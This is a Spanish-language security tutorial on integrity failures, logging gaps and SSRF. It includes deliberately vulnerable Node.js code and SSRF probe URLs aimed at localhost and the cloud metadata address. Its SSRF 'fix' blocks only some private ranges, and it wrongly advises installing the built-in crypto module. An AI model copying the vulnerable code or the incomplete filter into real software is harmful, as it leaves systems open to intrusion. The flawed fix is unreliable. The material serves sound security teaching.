Vamos a hacer una app simple en **Node.js** que descarga y ejecuta un archivo **sin verificar su integridad**. Luego veremos c√≥mo **corregirlo**.

---

#### üõ† Paso 1: Crear app vulnerable

```bash
mkdir software-integrity-fail && cd software-integrity-fail
npm init -y
npm install axios unzipper
```

#### Archivo: `downloader.js`

```js
const axios = require("axios");
const fs = require("fs");
const unzipper = require("unzipper");

// üî¥ Descarga y descomprime un archivo externo sin verificar
async function descargarPlugin() {
  const url = "https://example.com/plugin.zip"; // ‚ö†Ô∏è No verificado
  const zipPath = "./plugin.zip";

  const response = await axios({ url, responseType: "stream" });
  response.data.pipe(fs.createWriteStream(zipPath)).on("finish", () => {
    fs.createReadStream(zipPath).pipe(unzipper.Extract({ path: "./plugin" }));
    console.log("¬°Plugin descargado y descomprimido!");
  });
}

descargarPlugin();
```

#### ‚ùóProblemas:

- No se verifica si el archivo es confiable
- El atacante puede cambiar el contenido de `plugin.zip`
- Puede incluir c√≥digo malicioso

---

### ‚úÖ Paso 2: Soluci√≥n ‚Äî Verificar hash del archivo

Agrega dependencia:

```bash
npm install crypto
```

Modifica `downloader.js`:

```js
const axios = require("axios");
const fs = require("fs");
const crypto = require("crypto");
const unzipper = require("unzipper");

async function descargarPlugin() {
  const url = "https://example.com/plugin.zip";
  const zipPath = "./plugin.zip";
  const hashEsperado = "1a2b3c4d..."; // SHA-256 correcto

  const response = await axios({ url, responseType: "stream" });
  const file = fs.createWriteStream(zipPath);
  const hash = crypto.createHash("sha256");

  response.data.on("data", (chunk) => hash.update(chunk));
  response.data.pipe(file);

  file.on("finish", () => {
    const hashFinal = hash.digest("hex");
    console.log("Hash descargado:", hashFinal);
    if (hashFinal === hashEsperado) {
      console.log("‚úîÔ∏è Verificado: plugin seguro");
      fs.createReadStream(zipPath).pipe(unzipper.Extract({ path: "./plugin" }));
    } else {
      console.log("‚ùå El archivo ha sido modificado o es sospechoso");
    }
  });
}

descargarPlugin();
```

---

### ‚úÖ Mejora adicional: Subresource Integrity (SRI) en HTML

En vez de esto:

```html
<script src="https://cdn.example.com/lib.js"></script>
```

Haz esto:

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous"
></script>
```

---

### üìå RESUMEN

| Tema                | Detalle                                                       |
| ------------------- | ------------------------------------------------------------- |
| ¬øQu√© es?            | Ejecutar c√≥digo/datos sin verificar integridad o fuente       |
| Ejemplos comunes    | Scripts sin SRI, actualizaciones sin firma, CI/CD sin control |
| C√≥mo practicar      | OWASP Juice Shop, c√≥digo vulnerable en Node.js                |
| C√≥mo proteger       | Verificaci√≥n de hash, firmas, SRI, control de CI/CD           |
| Herramientas √∫tiles | cosign, SLSA, gitleaks, snyk, trivy                           |

---

[üîº](#√≠ndice)

---

## **771. Security Logging and Monitoring Failures**

### üìå ¬øQu√© es?

Esta categor√≠a se refiere a **la falta de registros (logs) adecuados y sistemas de monitoreo** para detectar, responder y mitigar incidentes de seguridad.

> Si no sabes lo que est√° pasando dentro de tu sistema, no puedes defenderlo.

---

### üéØ ¬øPor qu√© es importante?

- üìâ Si no hay **registro de errores o actividad sospechosa**, los ataques pasan desapercibidos.
- üïë Si no hay **monitoreo en tiempo real**, no puedes responder r√°pidamente.
- üîç Si los logs est√°n mal dise√±ados, no sirven para investigaciones posteriores.

---

### üö® Ejemplos f√°ciles de entender

#### üò¨ Ejemplo 1: No registrar intentos fallidos de login

Un atacante puede intentar **adivinar contrase√±as** cientos de veces, y si no se registran esos intentos, nadie lo nota.

```bash
POST /login
{
  "usuario": "admin",
  "clave": "1234"
}
```

‚û°Ô∏è Si hay 100 intentos con diferentes claves y **no queda ning√∫n registro**, ¬°es un riesgo enorme!

---

#### üò¨ Ejemplo 2: Logs incompletos

```log
[ERROR] Fallo en login
```

‚ùå No dice **qui√©n** fall√≥, **desde d√≥nde**, ni **cu√°ndo**.
Los logs deben ser **√∫tiles**, no solo existir.

---

#### üò¨ Ejemplo 3: No monitorear accesos sospechosos

Un usuario entra a `/admin` sin permiso y no se registra. O un token robado se usa desde otro pa√≠s.

‚û°Ô∏è Nadie lo sabr√° si no hay monitoreo.

---

### üìâ Consecuencias

| Riesgo              | Ejemplo real                              |
| ------------------- | ----------------------------------------- |
| No detectar ataques | Ransomware en un servidor sin alertas     |
| No saber qu√© pas√≥   | Imposible reconstruir un ataque           |
| No actuar a tiempo  | Usuario malicioso roba datos durante d√≠as |

---

### ‚úÖ Buenas pr√°cticas

| Pr√°ctica                                 | Descripci√≥n                                  |
| ---------------------------------------- | -------------------------------------------- |
| üìù Hacer logs detallados                 | Incluye IP, usuario, acci√≥n, hora            |
| üîê Proteger los logs                     | Solo accesibles para admins                  |
| üö® Monitorear eventos cr√≠ticos           | Intentos de login fallidos, cambios de roles |
| üì° Integrar con SIEMs (como ELK, Splunk) | An√°lisis centralizado de seguridad           |
| üîî Configurar alertas autom√°ticas        | Email o Slack ante comportamiento an√≥malo    |
| üìä Analizar logs regularmente            | No es solo almacenar, tambi√©n revisar        |

---

### üß∞ Herramientas para practicar

#### ‚úÖ OWASP Juice Shop

Incluye fallos de monitoreo y logging que puedes detectar.

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Luego entra a `http://localhost:3000`

üí° Explora los retos tipo: _Security Misconfiguration_, _Logging_, etc.

---

#### ‚úÖ ELK Stack (para monitorear)

- **Elasticsearch**: almacena logs
- **Logstash**: los procesa
- **Kibana**: los visualiza

Instala con Docker Compose o usa una plataforma como Logz.io o Elastic Cloud.

---

### ‚úÖ Ejemplo completo paso a paso

Vamos a crear una peque√±a app en **Node.js** que:

1. Tiene un sistema de login
2. Registra correctamente todos los intentos
3. Genera alertas simples si hay muchos intentos fallidos

---

#### üõ† Paso 1: Crear el proyecto

```bash
mkdir logger-demo && cd logger-demo
npm init -y
npm install express winston body-parser
```

---

#### üìÑ C√≥digo base (`index.js`)

```js
const express = require("express");
const bodyParser = require("body-parser");
const winston = require("winston");

const app = express();
app.use(bodyParser.json());

// ‚úÖ Configuraci√≥n del logger
const logger = winston.createLogger({
  level: "info",
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: "logs/error.log", level: "error" }),
    new winston.transports.File({ filename: "logs/activity.log" }),
  ],
});

const USERS = [{ usuario: "admin", clave: "Segura123" }];
let intentosFallidos = 0;

app.post("/login", (req, res) => {
  const { usuario, clave } = req.body;
  const user = USERS.find((u) => u.usuario === usuario && u.clave === clave);

  const ip = req.ip;
  const hora = new Date().toISOString();

  if (user) {
    logger.info({ evento: "Login exitoso", usuario, ip, hora });
    intentosFallidos = 0;
    res.send("Bienvenido, " + usuario);
  } else {
    intentosFallidos++;
    logger.warn({
      evento: "Login fallido",
      usuario,
      ip,
      hora,
      intentosFallidos,
    });

    if (intentosFallidos >= 5) {
      logger.error({ evento: "ALERTA: Muchos fallos", ip, hora });
    }

    res.status(401).send("Credenciales inv√°lidas");
  }
});

app.listen(3000, () => console.log("App corriendo en http://localhost:3000"));
```

---

#### üìù Resultado

- Cada intento exitoso y fallido queda en logs
- Si hay m√°s de 5 fallos ‚Üí Se genera una alerta en `error.log`
- Los logs se guardan en archivos locales

---

### üìÅ Carpeta `logs/`

Tendr√°s archivos como:

#### `activity.log`

```json
{
  "evento": "Login exitoso",
  "usuario": "admin",
  "ip": "::1",
  "hora": "2025-07-25T12:00:00Z"
}
```

#### `error.log`

```json
{
  "evento": "ALERTA: Muchos fallos",
  "ip": "::1",
  "hora": "2025-07-25T12:02:00Z"
}
```

---

### üîê ¬øC√≥mo mejorar a√∫n m√°s?

- Enviar logs a **Kibana** con `logstash`
- Enviar alertas por email con `nodemailer`
- Proteger los archivos de log con permisos seguros (`chmod 600`)
- Encriptar logs confidenciales

---

### üìå RESUMEN FINAL

| Tema                      | Detalle clave                                      |
| ------------------------- | -------------------------------------------------- |
| ¬øQu√© es?                  | No registrar ni monitorear acciones cr√≠ticas       |
| Ejemplos                  | Logins fallidos no registrados, logs sin info √∫til |
| C√≥mo practicarlo          | OWASP Juice Shop, app en Node.js                   |
| C√≥mo prevenirlo           | Usar logs con IP, timestamp, alertas, revisi√≥n     |
| Herramientas recomendadas | Winston, ELK, Splunk, SIEM, Zabbix, Prometheus     |

---

[üîº](#√≠ndice)

---

## **772. Server-Side Request Forgery**

### üìå ¬øQu√© es SSRF?

**SSRF (Server-Side Request Forgery)** es una vulnerabilidad que permite a un atacante forzar a un **servidor vulnerable** a enviar **peticiones HTTP** a **otros servidores internos o externos**, muchas veces sin que el servidor se d√© cuenta.

üëâ En otras palabras: **el atacante enga√±a al servidor para que act√∫e como un proxy** y realice una solicitud maliciosa.

---

### üß† Ejemplo f√°cil de entender

#### Escenario:

Una aplicaci√≥n permite al usuario cargar una imagen desde una **URL externa**:

```http
POST /cargar-imagen
{
  "url": "http://example.com/foto.jpg"
}
```

El servidor descarga la imagen y la guarda.

#### ‚ùå SSRF simple:

El atacante cambia la URL y pone algo como:

```json
{
  "url": "http://localhost:8000/admin"
}
```

El servidor, sin saberlo, accede a un **recurso interno** que deber√≠a estar protegido (como una base de datos, metadata cloud, etc).

---

### üéØ ¬øQu√© puede hacer un atacante con SSRF?

| Ataque posible             | Descripci√≥n                                                                  |
| -------------------------- | ---------------------------------------------------------------------------- |
| üì• Leer datos internos     | Acceder a `http://localhost`, `http://127.0.0.1`, o `http://169.254.169.254` |
| üåê Escanear la red interna | Detectar puertos abiertos, servicios internos                                |
| üîê Saltarse firewalls      | El servidor puede acceder a recursos a los que el atacante no puede          |
| üí• Ataques en cadena       | Usar SSRF para lograr RCE, XSS, LFI, etc.                                    |

---

### ‚ö†Ô∏è Servicios t√≠picamente vulnerables

- Funciones que toman URLs del usuario (para descargar archivos, validar enlaces, cargar im√°genes, etc)
- Formularios de carga por URL
- Herramientas PDF o thumbnails online
- APIs que permiten enviar peticiones a otras URLs

---

### üß™ C√≥mo probar SSRF (manual y autom√°tico)

#### 1. URL internas sospechosas:

- `http://localhost`
- `http://127.0.0.1`
- `http://169.254.169.254` ‚Üí Metadata en AWS/Cloud

#### 2. Herramientas para detectar:

- üì¶ **Burp Suite** (intercepta y modifica peticiones)
- üîé **SSRFire** (automatiza escaneos de SSRF)
- üß™ **OWASP ZAP** (scanner gratuito)

---

### üõ°Ô∏è ¬øC√≥mo prevenir SSRF?

| Acci√≥n                                            | Descripci√≥n                                             |
| ------------------------------------------------- | ------------------------------------------------------- |
| ‚úÖ Validar y filtrar URLs                         | Solo permitir dominios confiables, validar IPs          |
| üö´ No permitir `localhost`, IP privadas           | Evitar accesos a `127.0.0.1`, `10.x.x.x`, `169.254.x.x` |
| üîí No hacer redirecciones internas                | Nunca seguir redirecciones sin validaci√≥n               |
| üõë Desactivar resoluciones DNS si no es necesario | Evita resolver nombres de dominio no controlados        |
| üåê Usar firewalls salientes                       | Bloquear acceso a recursos internos desde servicios web |
| üö® Monitorear peticiones an√≥malas                 | Detectar patrones de acceso interno no habituales       |

---

### üß∞ C√≥mo instalar entorno vulnerable

#### ‚úÖ Usaremos **OWASP Juice Shop** para practicar

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Luego accede a: [http://localhost:3000](http://localhost:3000)

üí° Busca el reto "Server-side" o ‚ÄúSSRF‚Äù en el men√∫ de retos.

---

### üîß Ejemplo completo paso a paso

Vamos a crear una **aplicaci√≥n vulnerable a SSRF** y luego la **solucionamos**.

#### üß™ Paso 1: Crear app vulnerable en Node.js

```bash
mkdir ssrf-demo && cd ssrf-demo
npm init -y
npm install express axios body-parser
```

---

#### üìÑ `index.js` ‚Äî versi√≥n vulnerable

```js
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express();
app.use(bodyParser.json());

app.post("/fetch-url", async (req, res) => {
  const { url } = req.body;

  try {
    const response = await axios.get(url); // üî¥ sin validaci√≥n
    res.send(response.data);
  } catch (err) {
    res.status(500).send("Error al acceder a la URL");
  }
});

app.listen(3000, () => console.log("Servidor en http://localhost:3000"));
```

---

#### üß™ C√≥mo probarlo

Env√≠a una petici√≥n con `curl` o Postman:

```bash
curl -X POST http://localhost:3000/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:3000/admin"}'
```

üî¥ Si responde: ¬°la app es vulnerable a SSRF!

---

### üõ†Ô∏è Soluci√≥n segura: Validar la URL

Actualiza `index.js` para bloquear IPs internas:

```js
const net = require("net");
const dns = require("dns").promises;

function isInternalIp(ip) {
  return (
    ip.startsWith("127.") ||
    ip.startsWith("10.") ||
    ip.startsWith("192.168.") ||
    ip === "localhost"
  );
}

async function validarUrlSegura(url) {
  const hostname = new URL(url).hostname;
  const addresses = await dns.lookup(hostname);
  return !isInternalIp(addresses.address);
}

app.post("/fetch-url", async (req, res) => {
  const { url } = req.body;

  try {
    const seguro = await validarUrlSegura(url);
    if (!seguro) return res.status(403).send("URL prohibida por seguridad");

    const response = await axios.get(url);
    res.send(response.data);
  } catch (err) {
    res.status(500).send("Error al acceder a la URL");
  }
});
```

---

### üìå Resumen final

| Tema            | Detalle                                                           |
| --------------- | ----------------------------------------------------------------- |
| ¬øQu√© es SSRF?   | Cuando el servidor hace solicitudes por el atacante               |
| Riesgos         | Acceder a redes internas, metadata cloud, escaneo de puertos      |
| C√≥mo se explota | Usando URLs internas en funciones que hacen solicitudes           |
| C√≥mo prevenir   | Validar dominios, bloquear IPs privadas, usar firewalls salientes |
| C√≥mo practicar  | Juice Shop, app vulnerable con axios en Node.js                   |

---

[üîº](#√≠ndice)

---

| **Inicio**         | **atr√°s 7**                                                | **Siguiente 9**                                    |
| ------------------ | ---------------------------------------------------------- | -------------------------------------------------- |
| [üè†](../README.md) | [‚è™](./7_7_Seguridad_Informatica_para_Equipos_Tecnicos.md) | [‚è©](./7_9_Curso_de_Introduccion_al_Pentesting.md) |
